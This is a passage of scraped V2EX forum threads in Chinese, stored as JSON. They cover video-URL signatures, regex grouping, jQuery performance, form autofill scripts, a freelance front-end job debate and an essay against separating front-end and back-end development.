"\t\t<url><![CDATA[http://cn-gdgz6-cmcc.acgvideo.com/vg6/d/a1/10787909-1.flv?expires=1476200100&ssig=An43cMqaUj6pwasmRfDHIw&oi=3085847589&rate=0]]></url>\r", "\t\t<backup_url>\r", "\t\t<url><![CDATA[http://cn-gdsz-cmcc-v-01.acgvideo.com/vg7/a/a6/10787909-1.flv?expires=1476200100&ssig=CNLPRVms-jNUr9iWtYwywA&oi=3085847589&rate=0]]></url>\r", "\t\t<url><![CDATA[http://cn-gdgz2-cmcc.acgvideo.com/vg2/8/30/10787909-1.flv?expires=1476200100&ssig=n1LjEiAzTmQB_3QQsL9tJw&oi=3085847589&rate=0]]></url>\r", "\t\t</backup_url>\r", "\t</durl>\r", "\r", "我现在碰到的问题就是，怎样获取我上面发的那个地址里的“ sign=(认证签名)”", "上接#17 的内容\r", "\r", "“ sign=(认证签名)”无论在抓包得到的数据、网页代码或者 js 文件里都找不到", " 你那就是超清，.flv 的\r", "sign 计算在 flash 里，把它拆了就能得到了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如何从“初三十班某某同学”中提取出某某来</p>\n</div></div>"], "reply": "16", "tittle": "请教 js 中文正则表达式", "comment": ["你这个题目发了 14 分钟，有 20 次点击，却没人回答的原因是你问题之前没有百度和谷歌过，并不是大家不会", " ", " /[^初三十班(.+)同学$]{5}/ 这样优化了一下，多谢", " 差点一口血喷在屏幕上，你自己试了么。。。\r", "正则里的这些字符感觉你完全没理解", " 正在学正则表达式，我想限制下匹配长度，/[^初三十班(.+)同学]{5}/ 这样写打印出来确实是我需要的，我也迷糊了，明天把正则表达式好好看看", "/初三十班(.+)同学 /.exec('初三十班某某同学')[1]\r", "\"某某\"", "正则的一些知识点；感兴趣可以看一下，自己写岂不是更好；\r", "github 地址：\r", "Python 版：\r", "import re\r", "re.search(pattern = r'初三十班(.+)同学', string = '初三十班某某同学').group(1)\r", "\r", "主要就是用到正则表达式里面用小括号分组。", "你都知道有正则这么个东西了还来问，", " 你这串正则就是正宗的瞎几把搞。", "估计楼主下个问题就是，怎么把课程表美化。", "用非贪婪模式试试吧，/初三十班(.+?)同学 /\r", "\r", "有时间还是学学正则，正则绝对是个有用的小工具，楼上说的都是为了楼主好", " 上面正则表达式里最后多了一个空格，用的时候记得删除掉", "～～自己还是做过尝试之后再把问题提出来，大部分人都不喜欢伸手党的\r", "\r", "say \"初三十班某某同学同学\" ~~ m:P5/初\\w\\w 班(\\w+)同学 /;\r", "\r", "say \"初三十班某某同学同学\" ~~ m:P5/初\\w\\w 班(\\w+?)同学 /;\r", "\r", "运行测试： ", " = =看得我一头黑线。。。。", " /\r", "楼主这个网站可以用的到"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>最近想提升下前端的性能，但发现不管什么都会遇到 jQuery 的 fix ，然后浏览器就 relow 了（至少在谷歌浏览器里是这样）。导致很多操作尤其是拖拽非常之慢。</p>\n<p>试过一个叫 fastfix 的库，还是慢。据说升级到 jQuery 3 可以解决，有人试过吗？</p>\n<p>另外有人试过从一个代码库里把 jQuery 完全扔掉吗？感觉是个很大的工程，但是 jQuery 现在在各种给性能拖后腿。下贼船看起来很难的样子。</p>\n</div></div>"], "reply": "目前尚无回", "tittle": "有没有人遇到过 jQuery 的 fix 导致前端非常慢的？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>自从阿里月饼事件，对 js 产生了兴趣。最近在摸索如何利用 js 来模拟。现在遇到一下一个页面：\n网址：\n<a href=\"https://accounts.autodesk.com/register\" rel=\"nofollow\">https://accounts.autodesk.com/register</a>\n[利用 chrome 注入 jquery 插件来实现任何网页执行 jquery 。\n插件网址：\n<a href=\"https://chrome.google.com/webstore/detail/inject-jquery/indebdooekgjhkncmgbkeopjebofdoid?utm_source=chrome-app-launcher-info-dialog\" rel=\"nofollow\">https://chrome.google.com/webstore/detail/inject-jquery/indebdooekgjhkncmgbkeopjebofdoid?utm_source=chrome-app-launcher-info-dialog</a> ]</p>\n<p>针对上面的注册网址。我写了一下代码：</p>\n<p>$(\"#firstname_str\").val(\"han\");\n$(\"#lastname_str\").val(\"meimei\");\n$(\"#email_str\").val(\"test11@qq.com\");\n$(\"#confirm_email_str\").val(\"test11@qq.com\");\n$(\"#password\").val(\"hanmeimeizhaolilei\");\nif($(\"#PrivacyPolicyAccepted\").val()===\"false\"){\n$(\"#privacypolicy_checkbox\").click();\n}</p>\n<p>填表是自动填写了，但是表单需要自动验证邮箱等正确与否，需要调用到组件。。\n我用  .change 还是无法让它工作。</p>\n<p>请问如何分析这个页面，实现通过代码触发？\n求渔，不求鱼。</p>\n</div></div>"], "reply": "11", "tittle": "如何用 js 触发页面的 js 验证来实现模拟人工操作", "comment": ["求渔是吧。\r", "请看 《 javascript 高级程序设计》和 《 javascript dom 编程》", "浏览器有安全机制，你无法只通过 JS 代码来模拟人类的行为，只能手动触发， Event 对象有个 isTrusted 属性，就是用来区别人类和机器的", " 有空看看。因为现在看了基础，想边实践，变学习。有些问题会纠结很久没有进展，所以，希望有人帮忙指点一下。", " 感谢。但是现在基础有点差。英文不是很懂。 nodejs 这个入门也要一段时间。我要先看看 js 相关的。能否帮忙把上面的这个分析一下。", " 现在这个 chrome 好像没有支持。但是上面这个如何触发呢？", "直接提交不行吗？", " 这个相当于一个联系。人工点击当然是可以的咯", "这网页应该用 $(\"#btnSubmit\").click(); 来触发提交", " 简单来说就是个可以控制浏览器做各种操作的测试库"]},
{"content": ["<div class=\"topic_content\">如题，模仿写一个美团的下单页面 <a target=\"_blank\" href=\"http://i.waimai.meituan.com/restaurant/1520130\" rel=\"nofollow\">http://i.waimai.meituan.com/restaurant/1520130</a> ，查看购物详情是一个遮罩层实现的，但是在遮罩层下双击会使禁用缩放失效（ user-scalable=no 失效），不知道一般移动端怎么处理这样的问题</div>"], "reply": "目前尚无回", "tittle": "请问移动端，在遮罩层下会导致禁止缩放失效如何处理", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>demo 需求：</p>\n<ol>\n<li>将 json 内容，通过 ajax 请求，以 excel 设计的表格样式进行展现。\njson 示例:  <a href=\"http://note.youdao.com/noteshare?id=71eaea9c83d904a2fc53a6834e6d2113\" rel=\"nofollow\">http://note.youdao.com/noteshare?id=71eaea9c83d904a2fc53a6834e6d2113</a>\n表格示例: <a href=\"http://note.youdao.com/noteshare?id=d8906b1d05afe375b7310159412df343\" rel=\"nofollow\">http://note.youdao.com/noteshare?id=d8906b1d05afe375b7310159412df343</a></li>\n<li>构建本地环境测试，交付时只交付前端 css,js,html 文件。</li>\n<li>表格最终想实现的效果是：\n3.1 展现多个比赛的数据（数据来自 json ），赛事个数是不定长的数组（取 json 里的长度）。\n3.2 每场比赛有全-指标表和半指标表，每个指标表下又分为主指标和付指标；\n主指标和付指标的里面的指标个数都是不定长的数组，主指标在上面 repeat 显示（取 json 里的长度），付指标在下面 repeat 显示（取 json 里的长度），每个指标值都有不同的数据来源，数据来源数是不定长的数组（取 json 里的长度）.\n3.3 每个数据源对应两个固定值如\"[0.93,0.97]\"，第一个显示在上面，第二个显示在下面。</li>\n<li>表格和给的 json 示例格式是一致的，但有些数据不一致仅仅是数字是乱填的，主要为了体现格式。</li>\n<li>如果这个 demo 在 12 日 18:00 前完成，予以 180 元红包，且这个项目后面所有前端都可以外包给你实现。</li>\n<li>需求沟通联系方式： cXE6MzQ3MzA1Mzk=</li>\n</ol>\n</div></div>", "<div class=\"topic_content\">用 js 将一固定 json 格式转成一个 html &lt;div table&gt; ，作业水平即可，无任何浏览器兼容要求，无实现方法要求，无美观要求，仅仅一个 demo ，用 excel 只是为了描述 table 的 tr td 关系，瞧不起 180 红包的大神勿耻笑。</div>", "<div class=\"topic_content\">已经有人接下了，我不会忽悠多个人同时做，然后做了又不给钱，如果已经接下的人没搞定我再来求助。\r<br>大家不要加了，谢谢！</div>"], "reply": "68", "tittle": "一个朋友有个私活项目需要找个靠谱前端一起完成，有小 demo 进行考核，完成给 180 红包", "comment": ["天上有片云", "180 买饼吃", "不难实现，但 6 点前只有白天不用上班的人才搞得出来，你想想会是什么人", "前端真廉价： D", "感觉楼主得罪一票子前端的帖子 :-D", " 估计看都没看表格和 json 格式。。。表格并不复杂，描述看上去复杂是为了把需求描述更清楚，避免歧义。", "时薪 30R", "原本想看看 结果公司给风了", " V2EX 有股刻薄的风气， 我是估算两小时的工作量，考虑到做的人会有手头其他事情的干扰，所以定到 18 点；\r", "一个月 22 个工作日， 8 小时，相当于月薪 1.6k 的水平。给的这么个 demo ，无框架要求，无兼容性要求，显然是后续整站都包给作者完成的意图，如果满算两小时搞不定，技术上也达不到合作要求。", "喂，比尔吗？你把 windows 7 的系统源码卖给我吧，我出 250 元，什么，我不卖，我 R 你大爷的，你发封邮件才一秒钟，我给你 250 元，你还不领情，你这个白痴。真不会做生意", "喂，比尔吗？你把 windows 7 的系统源码卖给我吧，我出 250 元，什么，不卖，我 R 你大爷的，你发封邮件才一秒钟，我给你 250 元，你还不领情，你这个白痴。真不会做生意", " 1.6k??就算是 16k ，外包价格是要乘 1.5 左右", "还是找万能的淘宝，八戒吧。估计 50 块就能搞定。", "外包价格，一般是 x3,友情价一般才 x2,毕竟可以省掉大量其它杂项成本，综合成本其实低于自已招人开发", "呼叫 @廉价程序员", "在哪可以接 x3 价的活， x2 也行，求介绍！你说的省掉的这些成本会在需求变化的时候成倍的变回来，还不算沟通成本和延期风险，有经验的私活都知道首单价格都不重要，用户接受了你的方案，落地后就别无他选了，只要用户有真实需求，钱都是可商量的。", "全国不同地方、不同水平的程序员，价格差别巨大。楼主这个价不能说不合适，只能说不适合 V 站的水平。\r", "推荐楼主去 ", " ， 180 元应该能找到人做，甚至用不到 180 元。", "180 一顿饭？", " 谢谢，其实并不是 180 的事，仅是一个有偿帮助完成子任务时也能筛选出能实现基本的 json 转 table ，能理解需求，能在可接受时间范围内完成子任务的人进行长期合作，而且就是面向月薪 1.6k 的人", "挺简单的，楼主自己捣鼓捣鼓也能搞出来", "说句实话, 只是 demo 的话, 给个红包不算过分", " 我是想找个靠谱前端一起合作， V2EX 的嘴炮大神太多，很多问题都会上升到价值观的讨论。", " 您 180 一顿饭的大神看不起咱一个单 json 转 table 180 的活", " 这个比喻实在是 low 到爆。。。", "我从来不相信，一个智商有点有问题的人，会付的起钱。。。。。。", "我也从来不相信，大神会与 loser 为伍", "还是自已花点时间学习学习搞搞吧，反正你的时间不值钱", "不太理解，需要使用纯 js 生成一个 excel ?", " 咱一个月只挣的起 1.6k 的钱，不烦恼大神您在我的帖子上浪费时间了，谢谢。", "  不是，用 js 将 json 转成一个<div table> ，作业水平即可，无任何浏览器兼容要求，无实现方法要求，无美观要求，仅仅一个 demo ，用 excel 只是为了描述 table 的 tr td 关系。", "感觉楼主不提红包的事情，反而会有人帮你做，反正举手之劳。", "我来分析分析为啥会群嘲\r", "“能在可接受时间范围内完成子任务的人进行长期合作，而且就是面向月薪 1.6k 的人”\r", "嗯，面向 1.6k ？ 我觉得，这个月薪的一般看不上 200 块。要是我的话情愿拿这个时间去看书。\r", "当然这是我的猜测，毕竟我可没这么高的工资。\r", "合作？ 这个词会让人联想到“期权”等，现在有太多的就差一个码农，谁知道以后有没有合作？\r", "楼主的回复给人一种嫌淘宝写的烂，又嫌 v2 要加高的感觉。", " ", " \r", "随便百度下就有个 demo 生成的表格比你给的例子更清晰", "  嗯，如果变成大神求助贴，帮忙看看代码之类的，可能会有热心的人帮忙实现，但主要是为了找靠谱合作伙伴完成后续，而且 180 虽然不多，对于这个 demo 而已，尊重劳动力并不过分。", " 个人认为这个需求确实不难，红包价格也还行啦。 只不过我不太想做前端~ 做烦了 哈哈", "  没上上升到期权这么高大上，仅仅是一起做做私活项目挣点生活费而已。。。", "综上，楼主应该换个标题，\r", "我想了一个\r", "王八蛋前端黄鹤跑了，我们只能让后端妹子写前端。碰到了个 ajax 转表格的问题，求大神帮助啊。\r", "估计过半个小时就有一堆人自动把代码贴上来了。", "好奇问下这个联系方式是用什么加密的?", "刚打算接..", " base64", "就是一个人肉翻译 json 的问题吧，楼主看起来还算挺有诚意。。。毕竟把需求写清楚的时间都能撸一个了。。。", "我感觉“考核”这个词用得不好。。", "有现成解决方案 内部 oa 系统在用 1800 卖你 demo", " 你看到等于号结尾的，就该想到是 base64. 虽然不是所有的都有等于号。", " 你这个太过分了，挡了好多人的晚饭啊", " \r", "看到楼主说已经联系到人了才发的链接,供参考学习哈.", "V2EX 这个风气不好\r", "\r", "LZ 明显在为一整个项目招前端， 180 的项目只是看看是否靠谱。\r", "而且这 180 是按照 16k 月薪 2 小时工作量估算的。好，就算说兼职要 x2 ， 16k 月薪程序员看不起， 8k 程序员总看得起了吧。\r", "这个活是 8k 程序员做不了的？ 8k 程序员不配上 V2EX 了？\r", "\r", "整天想要远程啊，兼职的帖子何其多，按照 V2EX 这标准，时薪不给个三五百的，都看不上眼。\r", "那问题来了，哪有时薪三五百的兼职？", "V2 现在风气不就这样，眼高手低，不爽就辞", " 反正管他三七二十一，看到 180 先上来批判一番。 心里想就算错了肯定也支持我的多啊。", " 有理", "Excel 的方式显示？？？ 要是只在 PC 断还好。。。", "连顿烧烤钱都赚不回来，谁闲着蛋疼会做？\r", "\r", "建议你去学校里面找那种最差的，估计会接", "目测就是时薪 100 加的需求，可以我看到已经过点……", " 认同。\r", "\r", "每次看 V2EX ，总觉得已经实现了「全民中产」的错觉，好像月薪没有 20K 基本都没脸见人了？？\r", "\r", "实际上，如果你觉得这个 180 太便宜了，说明可能这个不适合你来做，但并不代表别人就不心动。\r", "\r", "各位，你们觉得呢？", "还以为要用 JS 实现 excel 效果展示 JSON 数据呢", "我来说一句，我觉得楼主明码标价给了 demo 的价格。还是不错的。\r", "\r", "回想曾经创业的时候，三天两头一些串串要你做个 demo ，或者给个方案，或者评估一下工作量。然后就没有然后的。比起来楼主还是不错的。", "handlebar 几行代码就搞定了", "1.6K 是 1600 吧？", " 笔误 16k", "感觉合理，很有诚意", "标题不是写着想招人然后这个是考核么……楼上你们是不是理解错了？", "V2 现在一群喷子，看回复都只能选择性过滤了。\r", "我看看啥时候能上升到西贝那样无点不喷。", "我觉得楼主这个没问题吧，这个 demo 只是个考核，又不是整个项目给你 180 ， v2 上的人薪资都是年薪几十万，一个抢楼送 T 恤都争得吃香难看，无法理解", "多年以前写过一个 jquery 插件就是干这件事的 ", "我感觉楼主还行，只是测试而已，又不是项目报酬，干嘛这么多刻薄回复的", " 哦，我主要是强迫症，看见不少人沿着 1.6k 往下喷，一直以为是美刀。。。。\r", "\r", "勿怪。", " 可以"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>原文在 <a href=\"http://iwritejs.com/dont-seperate-backend-and-frontend/\" rel=\"nofollow\">http://iwritejs.com/dont-seperate-backend-and-frontend/</a></p>\n<hr>\n<p>我不知道国外有没有「前后端分离」的运动，我只知道国内的大公司喜欢搞这个。</p>\n<p>前后端分离大概的意思就是后端只给前端提供数据，前端负责 HTML 渲染（可以在服务器渲染，也可以在浏览器渲染）和用户交互。</p>\n<p>说这个说得最多的就是阿里的前端了。同时阿里的前端也是在中国最活跃的。</p>\n<p>为什么做前后端分离？</p>\n<p>本篇文章我来<strong>腹黑地揣测一下</strong>原因。以下言论不针对某个个人，而是对前端群体的群嘲。我坦然接受你的反嘲讽。</p>\n<p>最开始的前后端：</p>\n<p>图一\n<img alt=\"\" src=\"http://iwritejs.com/content/images/2016/08/New-Mockup-1.png\"></p>\n<p>某些团队做前后端分离，主要的原因是</p>\n<ul>\n<li>如果不分离，前端对网站的控制力太弱，没有话语权。</li>\n<li>前端想要扩大势力范围。扩大了势力范围才有晋升的机会。</li>\n</ul>\n<p>在前后端分离之前，前端就是页面仔。技术大牛都是后端，鲜有前端能晋升到架构师层级。这不是对前端的歧视，而是前端真的只是做做页面、加个动效而已，凭什么晋升到架构师。</p>\n<p>当时前端能控制的，就是 CSS 和 JS 文件。连 HTML 都是放在后端的仓库的。因为 HTML 是由服务器输出的，用到的模板语言就是后端的。</p>\n<p>Node.js 火了之后，前端看到一个机会， HTML 是可以用 Node.js 来输出的呀，于是鼓吹前后端分离，把 HTML 层面交给前端来控制。这样前端就能管控更多的东西了（好可怜，终于能掌握 HTML 的控制权了）</p>\n<p>HTML 如果放在浏览器渲染，就是下图</p>\n<p>图二\n<img alt=\"浏览器渲染\" src=\"http://iwritejs.com/content/images/2016/08/New-Mockup-2.png\"></p>\n<p>HTML 如果用 Node.js 渲染，就是这样</p>\n<p>图三\n<img alt=\"\" src=\"http://iwritejs.com/content/images/2016/08/New-Mockup-3.png\"></p>\n<p>看起来只是掌握了 HTML 的控制权，但是这里面可以做的文章可多了。</p>\n<p>以前 HTML 是 Java 、 PHP 输出的，或多或少存在效率不高的地方，现在用 Node.js 重写，效率是不是就提升了（很少有程序重写了，效率还下降的）。效率提升了是不是该奖励下前端，给几个晋升名额呢？</p>\n<p>前端得到好处了，就更要巩固自己的地位了。以前的 jQuery 代码，后端看看就懂。「那不行，我要搞点后端看不懂的」，这样才能显示我前端的技术含量，这样才能升值加薪啊。于是 React 、 Gulp 什么全加上。</p>\n<p>好了，我编不下去了。</p>\n<p>总之我不认同这种前后端分离。</p>\n<p>为什么？</p>\n<p>因为</p>\n<ol>\n<li>又增加了一个中间层（当然程序员通过增加中间层来解决问题），好处是有，职责明确；但是也有坏处：人为地拉长了战线。对比图一和图三你就会发现，结构变复杂了，一个人能做的事情变成需要<strong>两个人</strong>做了</li>\n<li>并没有实质变化。以前的后端结构也是存在调用 Service 逻辑的，现在只不过换成让前端用 Node.js 做。除了把本来就吃紧的前端人力耗费在他不擅长的领域，我没看到什么提升。这里唯一的好处就是前端是势力范围扩大了。</li>\n</ol>\n<p>我认同的是「全栈工程师」。</p>\n<p>一个业务的前后为什么要分给两个人写？以表单提交为例，后端要对数据做校验，前端也要做。为什么要让两个人都写一次？前端说可以让后端也写 Node.js ，这样就可以服用代码了呀。</p>\n<p>搞笑吗？后端写了三年的 Java 你现在告诉他要全部重来？后端肯定不愿意啊。</p>\n<p>矛盾就出在，分『后端』和『前端』两个职位上。</p>\n<p>大公司细分后端和前端，也是可以理解的。这里不表。</p>\n<p>我只是说前端端分离的缺点：</p>\n<ol>\n<li>\n<p>大部分站点，不应该分前后端。除非你的前端，<strong>非常非常非常</strong>复杂。但是大部分站点的前端，根本没有那么复杂！</p>\n</li>\n<li>\n<p>分了前后端很容易出现各自为政的情况。推诿、邀功、互相鄙视，不一一列举了。</p>\n</li>\n<li>\n<p>有人问一个人怎么又学后端又学前端？我的建议是把前端做薄，如果没有必要，不要搞什么 Angular 、 React 。用原生 JS 或者 jQuery 能满足大部分网站。同时后端向 Rails 学习。局部交互复杂的地方，采用动态加载来做交互。</p>\n</li>\n<li>\n<p>有人说你是前端的叛徒，你这么做前端还有什么前途。</p>\n<p>搞笑，你做了前端就要一辈子为前端说话吗？太屁股决定脑袋了吧。</p>\n</li>\n</ol>\n<p>标题有点标题党，其实真正主题是：前后端分离是前端不得志的必然结局。（好像更标题党了 XD ）</p>\n<hr>\n<p>难道前后端分离没有好处吗？</p>\n<p>我觉得只有一个好处：好招聘。毕竟你要招一个优秀的全栈工程师是极其困难的。</p>\n<p>有人说，你真有意思，说这么多缺点，你还不是给不出解决方案，说了跟没说一样。</p>\n<p>说下我的思路</p>\n<ol>\n<li>\n<p>保持前端简单，复杂了就用原生的方式封装，具体来说就是用自定义标签来封装复杂组件。这样一来，后端同事还是可以开发页面，因为只是多了一个自定义标签而已，本质还是 HTML</p>\n</li>\n<li>\n<p>尽量不要在开发状态加 watcher ，目的也是让后端可以直接上手，不需要了解那么多工具。转译放到 Web 框架的开发者模式里面做，看到 less 请求加转义成 CSS 不是什么难事也不复杂。</p>\n</li>\n<li>\n<p>前端只是辅助（这里说的是大多是网站，不包括重型 Web 应用），前端要做好服务化：健全的文档、友好的接口。</p>\n</li>\n<li>\n<p>前端也要学后端知识，别在那自嗨。</p>\n</li>\n<li>\n<p>小公司别搞前后端分离，徒增复杂度！！！</p>\n</li>\n</ol>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>有些人老是喜欢揣测我的能力是不是不行才这么说。</p>\n<p>工作经历：</p>\n<ol>\n<li>毕业前在腾讯某前端部分实习近一年</li>\n<li>在腾讯、阿里纯前端部门工作三年（jQuery、Vue.js 和 React.js）。</li>\n<li>在某创业公司做单页面应用一年（Angular和Backbone）</li>\n<li>目前在学后端（用过 PHP、C#，现在在用 Rails）。</li>\n</ol>\n<p>其他的情况看我以前的帖子</p>\n</div></div>", "<div class=\"topic_content\">严格来说，我做了四年『纯前端』，所以不要以为我是后端开发。</div>", "<div class=\"topic_content\">我回复太快，被限制回复了……</div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/ibudao\">ibudao</a> 如果这些好处没有带来弊端，那当然是好。但是你 client render 之后，逻辑分散、状态不一致的问题要怎么解决呢？\r<br>另外，渲染重，你有两个选择：让一个前端把渲染放到浏览器做，或者再买一台服务器。显然，服务器更便宜。</div>", "<div class=\"topic_content\">@<a target=\"_blank\" href=\"/member/zlgodpig\">zlgodpig</a>  关于首屏与第二屏的问题。这个确实是前后端分离的最大契机。\r<br>以前所有页面都是一次输出的，但是大公司首页实在太大了，功能太多，等全部渲染完， 10 秒钟都过去了。\r<br>于是乎，第二页让 JS 来动态渲染。\r<br>\r<br>这里有两种场景：\r<br>1. 第二页的内容与第一页没有关系（这个有点奇怪，为什么不新开页面）\r<br>2. 第二页的内容与第一页的结构基本一样（如微博、推特）\r<br>\r<br>场景 2 最著名的解决方案就是 big pipe ，后端前端混合方案。你说的分离是一种方案，但不是唯一的方案。\r<br>场景 1 我觉得就是产品经理的问题，需求没想好。\r<br>\r<br>前端工程独立管理看从哪个角度了，维护权给前端没问题，但是可以集成到后端的，比如后端路由发现是 less 请求，直接就变成 CSS 内容。然后发布之前， build 一下前端资源就好了。\r<br>\r<br>我反对的是把简单的事情做复杂，把一个人能做的事情给两个人做。\r<br>\r<br>比如 V2EX 上好几个人发帖『用 vue.js 做了一个 XXX 页面』，说实话，用 PHP 加 jQuery 几下就弄出来了。性能还比他好。\r<br>\r<br>其他：\r<br>\r<br>启动服务器工程慢，就要解决慢的问题。</div>", "<div class=\"topic_content\">我又不能回复了 @<a target=\"_blank\" href=\"/member/Livid\">Livid</a> ，我没有太频繁啊。</div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>你们就不要拿空洞的『细分总是好的』『发展规律』这种话来讨论了。</p>\n<p>你司咋不专门雇一个人写 HTML、一个人写 CSS、一个人写 JS 呢？</p>\n<p>而且现在前端把所有东西都跟后端隔开，到底有什么好处？</p>\n<ol>\n<li>解耦？如果你认为后端输出就不能解耦，只能说你的后端框架有问题。</li>\n<li>处理bug方便？那是因为你们的后端不会写前端，前端不会写后端造成的。就跟一个人学了 CSS 但是不会 JS 一样。</li>\n<li>对开发者要求太高？是的，所以我说要把前端做薄，不要搞单页面框架。用 jQuery 你遇到过什么很复杂的 bug 吗？反观 React，一旦出了 bug，呵呵。</li>\n</ol>\n</div></div>", "<div class=\"topic_content\">再说不分离的好处：\r<br>\r<br>1. 一个人知道整个业务。任何业务问题，马上解决。\r<br>2. 代码量少。同样的逻辑不需要写两遍（相比浏览器渲染而言）。\r<br>3. 也能支持多端。/data 分 /data.json 和 /data.html 两种表现（ RESTful ）\r<br>4. 简单。所有概念都来自 W3C 标准，没有那些私有的概念（我说的就是 Virtual DOM ）\r<br>5. 省人力。多了 100% 的人力啊（分离需要两个人）</div>", "<div class=\"topic_content\">OA 跟 ERP ……\r<br>\r<br>这里有几个人是做这种软件的，这种软件完全符合我说的『非常非常非常复杂』好吗，当然需要前后分离。</div>", "<div class=\"topic_content\">机器到期，换地址了  <a target=\"_blank\" href=\"http://frankfang.github.io/dont-seperate-backend-and-frontend.html\" rel=\"nofollow\">http://frankfang.github.io/dont-seperate-backend-and-frontend.html</a></div>"], "reply": "546", "tittle": "为什么我不喜欢「前后端分离」（个人观点，欢迎来喷）", "comment": ["貌似题主其实问的是：渲染应该是后端搞还是前端搞？", "断人财路，犹如杀人父母。", "一想起一个页面要发起 N 个 HTTP API 请求就头疼……", "想起一个前端还要去改生成的模版代码就头疼", "想起前端也是一大堆模板代码就头疼", "想起我不用去改前端代码就开心", "补充一下，楼主拿一种稳定的模式所开发出的产品去对比一种新生的模式开发的产品并不是很合适，况且这种新模式处于一种发展阶段，并未处于稳定。同样，也并未觉得分离模式的出现是前端的“阴谋”，它之所以出现并且还在发展中，正是因为老模式的瓶颈让人们看到了它的可能性。同理它的出现也并未妨碍你们使用传统方式开发，选用什么样的方式开发一直都是个人的自由，作为一个合格的程序员，应该有自己的主观意识。", " 赚钱不算阴谋，但是大部分人不是根据需求选框架，这是事实。", " 不理解不是根据需求选框架，一个项目，就我们公司而言，所要选用的框架和技术路线，都是要前端后端和产品一起根据业务逻辑来讨论的。赚钱不算阴谋可以理解为“前端是为了高工资才提出前后端分离”吗？一个项目用不用前后端分离是 team leader 决定的，的确，选择新技术而踩坑，保留老技术而稳定，都是他们该考虑的，如果前端工作量提升，那么工资提升也是不争的事实。", "PHP 是世界上最好的语言。", "我也觉得应该只有全栈,没有前后端,但是我希望将不重要的数据交由客户端去处理,能转嫁给用户的成本一定不要自己抗", "这个问题好火，忍不住也来 BB 两句。\r", "我是个移动开发，同时也做些全栈的事，想从非专业角度看看\r", "\r", "记得最早去豆瓣实习时，被 Leader 喊去写后端， template 用 mako ，帮前段实现简单通用的模板，然后渲染出一点数据丢在模板上让他们自己用，感觉这就是道完形填空题，前段留下空，我给他渲染数据。。。。\r", "\r", "后来自己创业也沿袭这样干，但接触 AngualrJS 后发现用模板给前端传数据好蠢，同时也根本不需要模板啊， ag 这么方便，全都自己造就好了，就当自己是个 app ，接口自取。同时这样也节省了开发量，后端只负责数据接口，“前端”（ Android iOS Web ）自己玩。\r", "我不知道这里有多少全栈工程师会有这样的体验，当混着写 python java css html 时，人特别烦躁，但是只单独写一部分时，整个人都变得清爽了。虽然前后端移动端都是我写，但将他们分离时，异常舒服。\r", "\r", "创业失败后我在雪球混，以前自己搞量级小没发现的问题都出来了。比如后端接口的问题，如果只做数据接口，前端会很痛苦，可能为了渲染一个页面需要调用 4 5 个接口，又是异步状态，如何设计交互，如何快速响应都成了问题。但如果后端去帮前端封装，把几个接口合体甚至说直接给前端的类似模板的数据，比如第一行显示什么，第二行显示什么，那和当年直接丢个 html 出来有什么区别呢？？？\r", "现在的解决方案是，后端依旧只给数据接口，但是前端自己用 node 搞一层代理处理数据，相当于前端把一部分代码写到了 server 上，这样还能简单解决快速迭代不更新 app 的问题。\r", "这种方式目前感觉弹性最高，也解决了前后端撕逼的问题，但其实前端也在写 server ，那到底还是不是“前后端分离”呢？\r", "\r", "总之我觉得讨论什么架构依旧没意义，关键是要看需求场景，工程师的任务是以尽可能小的成本解决问题。", "刚好参与了今年阅文起点这边的项目改造，门户站这变走的就是 Node 做中间层框架机渲染，后端只提供数据，好处真的是大太多了。\r", "一个是解放了两个部门的人力，术业有专攻，原来的前端（偏重构）同事用本地构建工具(基本上就是本地模拟了一套 node server)来专心写页面，完全控制了 view 端还原和体验就好了，直出逻辑也全面接管（对于门户类站点直出需求很多)，后台的同事专心写数据相关和业务逻辑，提供 API 就好。让后端接手套模板，最后出来的乱七八糟的代码简直了，两边都不讨好。\r", "说到前端的话语权和控制权这块，一开始我们还想争取接管一点业务逻辑，直接被 PK 让我们安静地做渲染框架机就好，毕竟开发资源主要还是在后端技术部门，前端也没这个人力来做，但是在路由管理、轻量的模板直出逻辑这块，我们还是能够做到了拓展。", " 你这不就是前端往前后端融合方向走，后端做服务吗？\r", "说明你们也知道前后分离是错的。", " 你们用 client render 还是 server render", " 你是腾讯的？据我所知，「直出」是腾讯的前端才会说的。\r", "直出背后的逻辑就是，前端受不了只用 JSON API 来本地渲染页面，为了用户体验和性能，回到 Web 的正轨：后台渲染。", "没错， 客户端渲染注定是小众。", "前后端分离真正的分离应该是前端仅仅只需要开发一系列的组件，后端自己配数据，组装出页面，这才是最高效的方式", " 这说的是新技术，谁说新技术一定是客户端渲染", " 同意", "  这也是我一直非常喜欢 bootstrap ， ace 这种前端库的原因，既能适配手机，又能满足功能，界面还快，现在每次看到新框架做的花里胡哨的页面，花了非常多的时间做出来，居然连手机也不能自适应，各种浏览器兼容问题，页面源码全是 js 就觉得这绝逼要玩玩啊，如果是微博网页版和微博聊天，纯 js 渲染我觉得是正道", "但是大多数网站并不是单页面应用，却非得搞成单页面，或半单页面(肯定也有蹩脚的页面路由),我觉得就是走上邪路了", "就说一点。前后端分离跟 nodejs 有啥关系？和是不是全栈有啥关系？感觉楼主学艺不精啊。。", "还有工作经历不代表能力好不。。很擅长刷题，进大厂不也很容易？工程问题和技术能力还是有区别的", " 前端路由为的就是一个快，不需要每次都加载一大堆的 js ，虽然可以走缓存，但是也会影响浏览器渲染进程", "爱分不分", "前后端分离对于大公司才需要，小公司初创公司用最成熟的技术就可以了，验证业务才是主要原则。\r", "\r", "但是楼主，请问在规模化的业务场景下面，几十个甚至上百个前端对接后端团队，这个时候前后端分离，用 node 做中间层来渲染业务， api 来控制接口，那效率是不是可以提升？前端控制交互逻辑，数据展现逻辑，后端控制业务逻辑。分工明确，前端不用等后端接口， mock 数据，同时开发，是不是效率能提升？\r", "\r", "一切新技术都是为了效率。\r", "\r", "而且你也说了大公司喜欢搞这个，那是因为大公司的体积决定了他迈步子和小公司不一样。\r", "\r", "blabla 说了一大堆，你的意思其实是“不要为了分离而分离\"吧？", " 就没用前后端分离，而是 freemarker, 